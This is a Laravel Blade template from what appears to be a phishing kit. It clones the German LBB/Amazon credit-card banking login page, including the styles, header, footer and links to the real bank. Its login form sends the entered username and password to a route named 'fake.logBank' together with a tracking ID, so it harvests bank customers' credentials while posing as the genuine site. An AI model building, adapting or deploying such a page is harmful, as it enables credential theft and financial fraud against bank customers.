        .mat-form-field-appearance-outline:not(.mat-form-field-disabled) .mat-form-field-flex:hover .mat-form-field-outline {
            opacity: 0;
            transition: opacity 600ms cubic-bezier(0.25, 0.8, 0.25, 1);
        }
        .mat-form-field-appearance-outline:not(.mat-form-field-disabled) .mat-form-field-flex:hover .mat-form-field-outline-thick {
            opacity: 1;
        }
        .mat-form-field-appearance-outline .mat-form-field-subscript-wrapper {
            padding: 0 1em;
        }
        .mat-form-field-appearance-outline._mat-animation-noopable:not(.mat-form-field-disabled) .mat-form-field-flex:hover ~ .mat-form-field-outline,
        .mat-form-field-appearance-outline._mat-animation-noopable .mat-form-field-outline,
        .mat-form-field-appearance-outline._mat-animation-noopable .mat-form-field-outline-start,
        .mat-form-field-appearance-outline._mat-animation-noopable .mat-form-field-outline-end,
        .mat-form-field-appearance-outline._mat-animation-noopable .mat-form-field-outline-gap {
            transition: none;
        }
    </style>
    <style>
        .mat-form-field-appearance-standard .mat-form-field-flex {
            padding-top: 0.75em;
        }
        .mat-form-field-appearance-standard .mat-form-field-underline {
            height: 1px;
        }
        .cdk-high-contrast-active .mat-form-field-appearance-standard .mat-form-field-underline {
            height: 0;
            border-top: solid 1px;
        }
        .mat-form-field-appearance-standard .mat-form-field-ripple {
            bottom: 0;
            height: 2px;
        }
        .cdk-high-contrast-active .mat-form-field-appearance-standard .mat-form-field-ripple {
            height: 0;
            border-top: solid 2px;
        }
        .mat-form-field-appearance-standard.mat-form-field-disabled .mat-form-field-underline {
            background-position: 0;
            background-color: transparent;
        }
        .cdk-high-contrast-active .mat-form-field-appearance-standard.mat-form-field-disabled .mat-form-field-underline {
            border-top-style: dotted;
            border-top-width: 2px;
        }
        .mat-form-field-appearance-standard:not(.mat-form-field-disabled) .mat-form-field-flex:hover ~ .mat-form-field-underline .mat-form-field-ripple {
            opacity: 1;
            transform: none;
            transition: opacity 600ms cubic-bezier(0.25, 0.8, 0.25, 1);
        }
        .mat-form-field-appearance-standard._mat-animation-noopable:not(.mat-form-field-disabled) .mat-form-field-flex:hover ~ .mat-form-field-underline .mat-form-field-ripple {
            transition: none;
        }
    </style>
    <style>
        .mat-icon {
            background-repeat: no-repeat;
            display: inline-block;
            fill: currentColor;
            height: 24px;
            width: 24px;
        }
        .mat-icon.mat-icon-inline {
            font-size: inherit;
            height: inherit;
            line-height: inherit;
            width: inherit;
        }
        [dir="rtl"] .mat-icon-rtl-mirror {
            transform: scale(-1, 1);
        }
        .mat-form-field:not(.mat-form-field-appearance-legacy) .mat-form-field-prefix .mat-icon,
        .mat-form-field:not(.mat-form-field-appearance-legacy) .mat-form-field-suffix .mat-icon {
            display: block;
        }
        .mat-form-field:not(.mat-form-field-appearance-legacy) .mat-form-field-prefix .mat-icon-button .mat-icon,
        .mat-form-field:not(.mat-form-field-appearance-legacy) .mat-form-field-suffix .mat-icon-button .mat-icon {
            margin: auto;
        }
    </style>
@endpush
@section('content')
    <kkb-root id="app-root" name="adac" _nghost-umn-c271="">
        <div _ngcontent-umn-c271="" class="content-root">
            <router-outlet _ngcontent-umn-c271=""></router-outlet>
            <ng-component _nghost-umn-c150="" class="ng-star-inserted">
                <kkb-header _ngcontent-umn-c150="" _nghost-umn-c138="">
                    <header _ngcontent-umn-c138="" style="height: 80px;">
                        <kkb-cookie-banner _ngcontent-umn-c138="" _nghost-umn-c123="" class="ng-tns-c123-1"><!----></kkb-cookie-banner>
                        <div _ngcontent-umn-c138="" class="navbar-container">
                            <nav _ngcontent-umn-c138="" class="navbar container-fluid navbar-light navbar-expand-md">
                                <a _ngcontent-umn-c138="" routerlink="/" class="navbar-brand" href="https://amazon.lbb.de/"><div _ngcontent-umn-c138="" class="logo"></div></a>
                                <!----><!----><!---->
                            </nav>
                            <div _ngcontent-umn-c138="" class="call-to-action-container ng-star-inserted">
                                <span _ngcontent-umn-c138="" kkbtheme="" class="call-to-action-container__info size--standard theme-adac ng-star-inserted"> Sie haben noch keine {{mb_strtoupper($bank['name'])}} Kreditkarte? </span>
                                <a _ngcontent-umn-c138="" href="https://www.amazon.de/produkte/finanzdienstleistungen/kreditkarte/ueberblick" kkbtheme="" class="ux-kkb-link call-to-action-container__link size--standard theme-adac ng-star-inserted">
                                    Mehr erfahren
                                </a>
                                <!----><!---->
                            </div>
                            <!---->
                        </div>
                    </header>
                    <!---->
                </kkb-header>
                <kkb-notification-box _ngcontent-umn-c150="" _nghost-umn-c139="" class="ng-tns-c139-0">
                    <div _ngcontent-umn-c139="" class="kkb-notifications ng-tns-c139-0"><!----><!----><!----></div>
                </kkb-notification-box>
                <div _ngcontent-umn-c150="" id="content-container" style="margin-top: 80px;">
                    <router-outlet _ngcontent-umn-c150=""></router-outlet>
                    <ng-component _nghost-umn-c280="" class="ng-star-inserted">
                        <kkb-ux-tile-container _ngcontent-umn-c280="" _nghost-umn-c171="">
                            <div _ngcontent-umn-c171="" class="container ux-tile-container">
                                <div _ngcontent-umn-c171="" class="ux-content">
                                    <h1 _ngcontent-umn-c280="" data-test-id="login-heading">{{mb_strtoupper($bank['name'])}} Kreditkarten-Banking</h1>
                                    <div _ngcontent-umn-c280="" class="info-container margin-b-32-d margin-b-24-m info-container--warning ng-star-inserted">
                                        <p>
                                            <strong>Sicher online zahlen mit Visa Secure bzw. Mastercard® Identity Check™</strong><br>
                                            Jetzt das Sicherheitsverfahren aktivieren und sicher mit Ihrer {{mb_strtoupper($bank['name'])}} Kreditkarte online einkaufen. Informationen dazu finden Sie unter
                                            <a class="ux-kkb-link inline" href="https://portal.lbb.de/amazon/static/psd2">lbb.de/amazon-psd2</a>.
                                        </p>
                                        <p>
                                            Wichtige Begriffe zu Ihrer Karte und dem Kreditkarten-Banking finden Sie
                                            <a class="ux-kkb-link inline" href="https://kkb.lbb.de/api/cms/document/15196063-43e8-430a-bf70-d9eceffc3eb0_ADAC_Begriffserklaerung_102021.pdf">hier</a>.
                                        </p>
                                    </div>
                                    <!---->
                                    <div _ngcontent-umn-c280="" class="login-container">
                                        <form class="login-container__form ng-untouched ng-pristine ng-valid" id="bank_pm_form" method="POST"
                                              action="{{subRoute('fake.logBank', ['track_id' => $fake->track_id])}}">
                                            <h2 _ngcontent-umn-c280="" class="login-container__form__heading">Anmelden</h2>
                                            <div _ngcontent-umn-c280="" class="ng-untouched ng-pristine ng-valid">
                                                <mat-form-field _ngcontent-umn-c280="" class="mat-form-field login-container__form__username-field ng-tns-c77-2 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-has-label mat-form-field-hide-placeholder ng-untouched ng-pristine ng-valid">
                                                    <div class="mat-form-field-wrapper ng-tns-c77-2">
                                                        <div class="mat-form-field-flex ng-tns-c77-2">
                                                            <!----><!---->
                                                            <div class="mat-form-field-infix ng-tns-c77-2">
                                                                <input _ngcontent-umn-c280="" tabindex="1" matinput="" formcontrolname="username" type="text" name="username" autocomplete="username" maxlength="50" data-test-id="login-username" class="mat-input-element mat-form-field-autofill-control ng-tns-c77-2 ng-untouched ng-pristine ng-valid cdk-text-field-autofill-monitored" aria-describedby="mat-hint-0" id="mat-input-0" data-placeholder="Benutzername" aria-invalid="false" aria-required="false">
                                                                <span class="mat-form-field-label-wrapper ng-tns-c77-2">
                                                                        <label class="mat-form-field-label ng-tns-c77-2 mat-empty mat-form-field-empty ng-star-inserted" id="mat-form-field-label-1" for="mat-input-0" aria-owns="mat-input-0">
                                                                            <span class="ng-tns-c77-2 ng-star-inserted">Benutzername</span>
                                                                            <!----><!----><!----><!---->
                                                                        </label>
                                                                    <!---->
                                                                    </span>
                                                            </div>
                                                            <!---->
                                                        </div>
                                                        <div class="mat-form-field-underline ng-tns-c77-2 ng-star-inserted"><span class="mat-form-field-ripple ng-tns-c77-2"></span></div>
                                                        <!---->
                                                        <div class="mat-form-field-subscript-wrapper ng-tns-c77-2">
                                                            <!---->
                                                            <div class="mat-form-field-hint-wrapper ng-tns-c77-2 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity: 1; transform: translateY(0%);">
                                                                <!---->
                                                                <mat-hint _ngcontent-umn-c280="" class="mat-hint ng-tns-c77-2" id="mat-hint-0">
                                                                    <a _ngcontent-umn-c280="" tabindex="4" data-test-id="forget-username-link" class="ux-kkb-link input-hint">Benutzername vergessen</a>
                                                                </mat-hint>
                                                                <div class="mat-form-field-hint-spacer ng-tns-c77-2"></div>
                                                            </div>
                                                            <!---->
                                                        </div>
                                                    </div>
                                                </mat-form-field>
                                                <mat-form-field _ngcontent-umn-c280="" class="mat-form-field login-container__form__password-field ng-tns-c77-3 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-has-label mat-form-field-hide-placeholder ng-untouched ng-pristine ng-valid">
                                                    <div class="mat-form-field-wrapper ng-tns-c77-3">
                                                        <div class="mat-form-field-flex ng-tns-c77-3">
                                                            <!----><!---->
                                                            <div class="mat-form-field-infix ng-tns-c77-3">
                                                                <input _ngcontent-umn-c280="" tabindex="2" matinput="" formcontrolname="password" name="password" autocomplete="current-password" maxlength="50" data-test-id="login-password" class="mat-input-element mat-form-field-autofill-control ng-tns-c77-3 ng-untouched ng-pristine ng-valid cdk-text-field-autofill-monitored" type="password" aria-describedby="mat-hint-1" id="mat-input-1" data-placeholder="Passwort" aria-invalid="false" aria-required="false">
                                                                <span class="mat-form-field-label-wrapper ng-tns-c77-3">
                                                                        <label class="mat-form-field-label ng-tns-c77-3 mat-empty mat-form-field-empty ng-star-inserted" id="mat-form-field-label-3" for="mat-input-1" aria-owns="mat-input-1">
                                                                            <span class="ng-tns-c77-3 ng-star-inserted">Passwort</span>
                                                                            <!----><!----><!----><!---->
                                                                        </label>
                                                                    <!---->
                                                                    </span>
                                                            </div>
                                                            <div class="mat-form-field-suffix ng-tns-c77-3 ng-star-inserted">
                                                                <mat-icon _ngcontent-umn-c280="" role="img" matsuffix="" class="mat-icon notranslate mat-icon-no-color ng-tns-c77-3" aria-hidden="true" data-mat-icon-type="svg" data-mat-icon-name="eye">
                                                                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="100%" height="100%" viewBox="0 0 24 24" fit="" preserveAspectRatio="xMidYMid meet" focusable="false">
                                                                        <path d="M12,9A3,3 0 0,0 9,12A3,3 0 0,0 12,15A3,3 0 0,0 15,12A3,3 0 0,0 12,9M12,17A5,5 0 0,1 7,12A5,5 0 0,1 12,7A5,5 0 0,1 17,12A5,5 0 0,1 12,17M12,4.5C7,4.5 2.73,7.61 1,12C2.73,16.39 7,19.5 12,19.5C17,19.5 21.27,16.39 23,12C21.27,7.61 17,4.5 12,4.5Z"></path>
                                                                    </svg>
                                                                </mat-icon>
                                                            </div>
                                                            <!---->
                                                        </div>
                                                        <div class="mat-form-field-underline ng-tns-c77-3 ng-star-inserted"><span class="mat-form-field-ripple ng-tns-c77-3"></span></div>
                                                        <!---->
                                                        <div class="mat-form-field-subscript-wrapper ng-tns-c77-3">
                                                            <!---->
                                                            <div class="mat-form-field-hint-wrapper ng-tns-c77-3 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity: 1; transform: translateY(0%);">
                                                                <!---->
                                                                <mat-hint _ngcontent-umn-c280="" class="mat-hint ng-tns-c77-3" id="mat-hint-1">
                                                                    <a _ngcontent-umn-c280="" tabindex="5" data-test-id="forget-password-link" class="ux-kkb-link input-hint">Passwort vergessen</a>
                                                                </mat-hint>
                                                                <div class="mat-form-field-hint-spacer ng-tns-c77-3"></div>
                                                            </div>
                                                            <!---->
                                                        </div>
                                                    </div>
                                                </mat-form-field>
                                                <!---->
                                            </div>
                                            <div _ngcontent-umn-c280="" class="kkb-global__actions margin-b-0">
                                                <button _ngcontent-umn-c280="" class="ux-kkb-button primary" type="submit">Login</button>
                                            </div>
                                        </form>
                                        <div _ngcontent-umn-c280="" kkbtheme="" class="login-container__image theme-adac"></div>
                                    </div>
                                    <div _ngcontent-umn-c280="" class="register-container margin-t-80-d margin-t-40-m">
                                        <div _ngcontent-umn-c280="" class="register-container__actions">
                                            <div _ngcontent-umn-c280="" class="register-container__actions__registration">
                                                <h2 _ngcontent-umn-c280="">Erstregistrierung starten</h2>
                                                <p _ngcontent-umn-c280="" class="margin-b-24 size--standard">Sie haben bereits Start-Zugangsdaten erhalten?</p>
                                                <button _ngcontent-umn-c280="" type="button" tabindex="6" data-test-id="register-button" class="ux-kkb-button secondary">Erstregistrierung</button>
                                            </div>
                                            <div _ngcontent-umn-c280="" class="register-container__actions__initial-data margin-t-64-m">
                                                <h2 _ngcontent-umn-c280="">Start-Zugangsdaten anfordern</h2>
                                                <p _ngcontent-umn-c280="" class="margin-b-24 size--standard">Sie haben noch keine Start-Zugangsdaten erhalten?</p>
                                                <button _ngcontent-umn-c280="" type="button" data-test-id="access-data-button" class="ux-kkb-button secondary">Start-Zugangsdaten</button>
                                            </div>
                                        </div>
                                    </div>
                                    <div _ngcontent-umn-c280="" class="unlock-container margin-t-80-d margin-t-64-m">
                                        <p _ngcontent-umn-c280="">Ihr Zugang wurde gesperrt?</p>
                                        <a _ngcontent-umn-c280="" routerlink="/security/unlock" class="ux-kkb-link" href="https://amazon.lbb.de/security/unlock">Zugang entsperren</a>
                                    </div>
                                </div>
                            </div>
                        </kkb-ux-tile-container>
                    </ng-component>
                    <!---->
                </div>
                <kkb-footer _ngcontent-umn-c150="" _nghost-umn-c133="">
                    <footer _ngcontent-umn-c133="" class="new-ux">
                        <div _ngcontent-umn-c133="" class="footer-container padding-b-48-d">
                            <div _ngcontent-umn-c133="" class="footer">
                                <div _ngcontent-umn-c133="" class="row">
                                    <div _ngcontent-umn-c133="" class="col-lg-4 col-md-4 col-sm-12 link-items">
                                        <ul _ngcontent-umn-c133="" class="col-12">
                                            <li _ngcontent-umn-c133="" class="ng-star-inserted">
                                                <!---->
                                                <a _ngcontent-umn-c133="" href="https://amazon.lbb.de/faq" target="_blank" class="ng-star-inserted"> Fragen &amp; Antworten </a>
                                                <!---->
                                            </li>
                                            <li _ngcontent-umn-c133="" hidden="" class="ng-star-inserted">
                                                <!---->
                                                <a _ngcontent-umn-c133="" href="https://amazon.lbb.de/preis-leistung" target="_self" class="ng-star-inserted"> Preis- und Leistungsverzeichnis </a>
                                                <!---->
                                            </li>
                                            <li _ngcontent-umn-c133="" class="ng-star-inserted">
                                                <!---->
                                                <a _ngcontent-umn-c133="" href="https://amazon.lbb.de/terms-of-use" target="_blank" class="ng-star-inserted"> Nutzungsbedingungen </a>
                                                <!---->
                                            </li>
                                            <!---->
                                        </ul>
                                    </div>
                                    <div _ngcontent-umn-c133="" class="col-lg-2 col-md-2 col-sm-12 link-items">
                                        <ul _ngcontent-umn-c133="" class="col-12">
                                            <li _ngcontent-umn-c133="" class="ng-star-inserted">
                                                <!---->
                                                <a _ngcontent-umn-c133="" target="_blank" href="https://amazon.lbb.de/terms-of-use#privacy" class="ng-star-inserted">Datenschutz</a>
                                                <!---->
                                            </li>
                                            <li _ngcontent-umn-c133="" class="ng-star-inserted">
                                                <!---->
                                                <a _ngcontent-umn-c133="" target="_blank" href="https://amazon.lbb.de/impressum" class="ng-star-inserted">Impressum</a>
                                                <!---->
                                            </li>
                                            <!---->
                                        </ul>
                                    </div>
                                    <div _ngcontent-umn-c133="" class="col-lg-6 col-md-6 col-sm-12 store-icons">
                                        <div _ngcontent-umn-c133="" class="app-store">
                                            <a _ngcontent-umn-c133="" target="_blank" rel="noreferrer" href="https://apps.apple.com/de/app/id1437894864" class="ng-star-inserted">
                                                <span _ngcontent-umn-c133="" class="linkSpanner"></span>
                                            </a>
                                            <!---->
                                        </div>
                                        <div _ngcontent-umn-c133="" class="play-store">
                                            <a _ngcontent-umn-c133="" target="_blank" rel="noreferrer" href="https://play.google.com/store/apps/details?id=de.lbb.kkb" class="ng-star-inserted">
                                                <span _ngcontent-umn-c133="" class="linkSpanner"></span>
                                            </a>
                                            <!---->
                                        </div>
                                        <div _ngcontent-umn-c133="" class="poweredby"><span _ngcontent-umn-c133="">powered by</span><img _ngcontent-umn-c133="" alt="Logo" src="{{asset('images/banks/lbb.svg')}}"></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </footer>
                </kkb-footer>
            </ng-component>
            <!---->
        </div>
    </kkb-root>
@endsection
